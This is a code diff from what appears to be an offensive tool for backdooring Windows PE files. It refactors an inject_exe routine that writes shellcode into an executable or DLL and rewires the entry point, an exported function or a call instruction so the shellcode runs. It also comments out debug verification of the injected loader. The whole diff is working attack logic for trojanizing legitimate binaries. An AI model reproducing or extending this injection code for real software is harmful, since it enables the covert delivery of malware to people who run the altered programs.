@@ -7,7 +7,7 @@ from model.carrier import Carrier, DataReuseEntry
 from pe.pehelper import *
 from model.exehost import *
 from observer import observer
-from pe.derbackdoorer import PeBackdoor
+from pe.derbackdoorer import FunctionBackdoorer
 from pe.superpe import SuperPe
 from model.project import Project
 from model.settings import Settings
@@ -42,13 +42,13 @@ def inject_exe(
 
     # superpe is a representation of the exe file. We gonna modify it, and save it at the end.
     superpe = SuperPe(exe_in)
-    pe_backdoorer = PeBackdoor(superpe, main_shc, carrier_invoke_style)
+    function_backdoorer = FunctionBackdoorer(superpe, main_shc)
 
     shellcode_offset: int = 0
     if superpe.is_dll() and settings.dllfunc != "" and carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
         # Special case. put it at the beginning of the exported DLL function
         logger.info("--[ Overwrite DLL function {} with shellcode".format(settings.dllfunc))
-        rva = pe_backdoorer.getExportEntryPoint(settings.dllfunc)
+        rva = superpe.getExportEntryPoint(settings.dllfunc)
 
         # Size and sanity checks
         exports = superpe.get_exports_full()
@@ -83,11 +83,6 @@ def inject_exe(
         # Copy the shellcode
         superpe.pe.set_bytes_at_offset(shellcode_offset, main_shc)
 
-        # HACK
-        pe_backdoorer.shellcodeOffset = shellcode_offset
-        pe_backdoorer.shellcodeOffsetRel = shellcode_offset - sect.PointerToRawData
-        pe_backdoorer.shellcodeAddr = shellcode_rva + superpe.pe.OPTIONAL_HEADER.ImageBase 
-
         # rewire flow
         if superpe.is_dll() and settings.dllfunc != "":
             logger.info("---( Rewire: DLL function: {} ".format(settings.dllfunc))
@@ -97,10 +92,10 @@ def inject_exe(
                 raise Exception("We should not land here")
 
             elif carrier_invoke_style == CarrierInvokeStyle.BackdoorCallInstr:
-                addr = pe_backdoorer.getExportEntryPoint(settings.dllfunc)
+                addr = superpe.getExportEntryPoint(settings.dllfunc)
                 logger.info("--( Inject DLL: Patch {} (0x{:X})".format(
                     settings.dllfunc, addr))
-                pe_backdoorer.backdoor_function(addr, shellcode_rva)
+                function_backdoorer.backdoor_function(addr, shellcode_rva)
 
         else: # EXE
             logger.info("---( Rewire: EXE")
@@ -114,7 +109,7 @@ def inject_exe(
                 addr = superpe.get_entrypoint()
                 logger.info("--( Inject EXE: Patch main() (0x{:X})".format(
                     addr))
-                pe_backdoorer.backdoor_function(addr, shellcode_rva)
+                function_backdoorer.backdoor_function(addr, shellcode_rva)
 
         if source_style == FunctionInvokeStyle.iat_reuse:
             injected_fix_iat(superpe, project.carrier, project.exe_host)
@@ -124,14 +119,14 @@ def inject_exe(
     superpe.write_pe_to_file(exe_out)
 
     # verify and log
-    shellcode = file_readall_binary(shellcode_in)
-    shellcode_len = len(shellcode)
-    code = extract_code_from_exe_file(exe_out)
-    in_code = code[pe_backdoorer.shellcodeOffsetRel:pe_backdoorer.shellcodeOffsetRel+shellcode_len]
-    jmp_code = code[pe_backdoorer.backdoorOffsetRel:pe_backdoorer.backdoorOffsetRel+12]
-    if config.debug:
-        observer.add_code_file("exe_extracted_loader", in_code)
-        observer.add_code_file("exe_extracted_jmp", jmp_code)
+    #shellcode = file_readall_binary(shellcode_in)
+    #shellcode_len = len(shellcode)
+    #code = extract_code_from_exe_file(exe_out)
+    #in_code = code[function_backdoorer.shellcodeOffsetRel:function_backdoorer.shellcodeOffsetRel+shellcode_len]
+    #jmp_code = code[function_backdoorer.backdoorOffsetRel:function_backdoorer.backdoorOffsetRel+12]
+    #if config.debug:
+    #    observer.add_code_file("exe_extracted_loader", in_code)
+    #    observer.add_code_file("exe_extracted_jmp", jmp_code)
 
 
 def injected_fix_iat(superpe: SuperPe, carrier: Carrier, exe_host: ExeHost):
